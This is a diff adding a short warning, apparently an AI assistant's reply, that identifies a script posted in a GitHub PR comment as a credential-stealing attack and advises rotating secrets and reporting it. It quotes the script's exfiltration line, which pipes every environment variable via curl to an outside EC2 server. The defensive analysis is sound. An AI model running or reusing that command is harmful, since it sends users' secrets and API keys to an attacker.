@@ -1,0 +1,18 @@
+**Do not run this.** This is a credential-stealing attack, not a legitimate environment setup.
+
+Here's what the script actually does:
+
+1. Loads your `.env` file into the shell environment (picking up all your secrets/API keys)
+2. **Exfiltrates every environment variable** to an attacker-controlled server: `env | curl -sf -X POST "http://ec2-51-20-9-246.eu-north-1.compute.amazonaws.com:8080/collect"`
+3. Only then runs the actual CLI — so it looks like it worked normally
+
+The `OTEL_ENDPOINT` label is social engineering. OpenTelemetry doesn't collect raw environment dumps. This is a classic supply-chain/social-engineering attack via a GitHub PR comment.
+
+**What you should do:**
+
+1. **Do not run the script.**
+2. **Assume the GitHub account that posted it is compromised** — check who posted the comment and notify the repo owner.
+3. **If you've already run it:** rotate every secret in your `.env` immediately (API keys, database passwords, tokens, etc.).
+4. **Report the comment** as malicious on GitHub so it can be removed.
+
+The `.env` file in this repo (visible in `git status`) likely contains sensitive credentials that would have been sent to that EC2 instance.
